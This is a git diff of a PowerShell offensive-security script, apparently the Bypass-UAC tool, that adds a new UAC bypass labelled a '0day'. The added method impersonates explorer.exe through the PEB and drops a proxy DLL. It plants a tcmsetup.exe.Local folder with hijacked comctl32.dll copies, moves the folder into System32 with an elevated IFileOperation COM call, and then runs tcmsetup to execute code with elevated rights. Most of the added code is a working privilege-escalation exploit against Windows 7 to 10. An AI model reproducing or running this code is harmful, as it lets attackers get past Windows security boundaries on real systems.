@@ -20,6 +20,7 @@ Process Status API (PSAPI) which reads the process PEB.
 + UacMethodSysprep: x32/x64 Win7-Win8
 + ucmDismMethod: x64 Win7+ (unpatched, tested up to 10RS2 14926)
 + UacMethodMMC2: x64 Win7+ (unpatched, tested up to 10RS2 14926)
++ UacMethodTcmsetup: x32/x64 Win7-10 (UAC "0day" ¯\_(ツ)_/¯)
 
 .DESCRIPTION
 Author: Ruben Boonen (@FuzzySec)
@@ -44,7 +45,7 @@ C:\PS> Bypass-UAC -Method ucmDismMethod -CustomDll C:\Users\b33f\Desktop\cmd.dll
 #>
 	param(
         [Parameter(Mandatory = $True)]
-        [ValidateSet('UacMethodSysprep','ucmDismMethod','UacMethodMMC2')]
+        [ValidateSet('UacMethodSysprep','ucmDismMethod','UacMethodMMC2','UacMethodTcmsetup')]
         [String]$Method,
         [Parameter(Mandatory = $False)]
         [String]$CustomDll = $null
@@ -1290,7 +1291,7 @@ C:\PS> Bypass-UAC -Method ucmDismMethod -CustomDll C:\Users\b33f\Desktop\cmd.dll
     # 6.0  -> Vista / 2k8     #
     #-------------------------#
     $OSVersion = [Version](Get-WmiObject Win32_OperatingSystem).Version
-    $OSMajorMinor = "$($OSVersion.Major).$($OSVersion.Minor)"
+    [double]$OSMajorMinor = "$($OSVersion.Major).$($OSVersion.Minor)"
     if ($OSMajorMinor -lt 6.0) {
         echo "`n[!] Sorry, this OS version is not supported!`n"
         Return
@@ -1422,6 +1423,60 @@ C:\PS> Bypass-UAC -Method ucmDismMethod -CustomDll C:\Users\b33f\Desktop\cmd.dll
 
             # Clean-up
             echo "[!] UAC artifact: $($env:SystemRoot + '\System32\wbem\wbemcomn.dll')`n"
+        }
+
+        # UAC "0day" ¯\_(ツ)_/¯
+        'UacMethodTcmsetup'
+        {
+            # Hybrid tcmsetup method: tcmsetup -> tcmsetup.exe.local -> comctl32.dll
+            # Works on x64/x32 Win7-Win10 (unpatched)
+            if ($OSMajorMinor -lt 6.1) {
+                echo "[!] Your OS does not support this method!`n"
+                Return
+            }
+
+            # Impersonate explorer.exe
+            echo "`n[!] Impersonating explorer.exe!"
+            Masquerade-PEB -BinPath "C:\Windows\explorer.exe"
+
+            if ($DllPath) {
+                echo "[>] Using custom proxy dll.."
+                echo "[+] Dll path: $DllPath"
+            } else {
+                # Write Yamabiko.dll to disk
+                echo "[>] Dropping proxy dll.."
+                Emit-Yamabiko
+            }
+
+            # Create tcmsetup.exe.Local folder in %temp%
+            $TempFolder = $env:Temp + "\tcm$(Get-Random)"
+            echo "[>] Creating .local trigger folder: $TempFolder"
+            New-Item -Path $TempFolder -ItemType directory |Out-Null
+
+            # Create possible sub-directories
+            dir $($env:SystemRoot + '\WinSxS') |where-object {
+                $_.PSIsContainer -and $_.Name -like "*microsoft.windows.common*"
+            } | foreach {
+                New-Item -Path $TempFolder -Name $_.Name -ItemType directory |Out-Null
+                Copy-Item $DllPath -destination $($TempFolder + '\' + $_.Name + '\comctl32.dll')
+            }
+
+            # Remove proxy dll
+            Del $DllPath
+
+            # Expose IFileOperation COM object
+            Invoke-IFileOperation
+
+            # Exploit logic
+            echo "[>] Performing elevated IFileOperation::MoveItem operation.."
+            $IFileOperation.MoveItem($TempFolder, $($env:SystemRoot + '\System32\'), "tcmsetup.exe.Local")
+            $IFileOperation.PerformOperations()
+
+            echo "`n[?] Executing tcmsetup.."
+            IEX $($env:SystemRoot + '\System32\tcmsetup.exe')
+
+            # Clean-up
+            echo "[!] UAC artifact: $($env:SystemRoot + '\System32\tcmsetup.exe.Local\')`n"
         }
     }
 }
